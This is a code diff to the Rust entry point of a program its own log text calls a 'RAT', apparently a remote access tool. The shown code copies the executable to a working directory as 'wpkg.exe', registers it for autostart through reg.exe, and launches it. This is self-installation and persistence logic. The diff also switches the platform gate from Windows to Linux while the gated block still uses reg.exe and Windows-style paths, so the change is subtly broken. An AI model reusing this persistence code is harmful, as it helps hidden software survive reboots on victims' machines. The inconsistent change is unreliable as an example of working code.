@@ -55,9 +55,9 @@ async fn main() {
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
-    #[cfg(target_os = "windows")]
+    #[cfg(target_os = "linux")]
     {
-        use crate::utils::Utils;
+        use crate::utils;
         use std::env;
         use std::fs;
         use std::path::Path;
@@ -67,7 +67,7 @@ async fn main() {
         let install = || -> anyhow::Result<()> {
             let exe_path = env::current_exe()?.display().to_string();
 
-            let config_dir = Utils::get_working_dir()?;
+            let config_dir = utils::get_working_dir()?;
             let exe_target = format!("{}\\{}", &config_dir, "wpkg.exe");
 
             if exe_path != exe_target {
@@ -80,7 +80,7 @@ async fn main() {
 
                     //adding to autostart
                     info!("Adding to autostart");
-                    Utils::run_process(
+                    utils::run_process(
                         "reg.exe",
                         vec![
                             "add",
@@ -107,7 +107,7 @@ async fn main() {
                 //run wpkg
                 if runned <= 1 {
                     info!("Running WPKG...");
-                    Utils::run_process_with_work_dir(&exe_target, "", false, &config_dir)?;
+                    utils::run_process_with_work_dir(&exe_target, "", false, &config_dir)?;
                 } else {
                     error!("WPKG is runned. Exiting...");
                 }
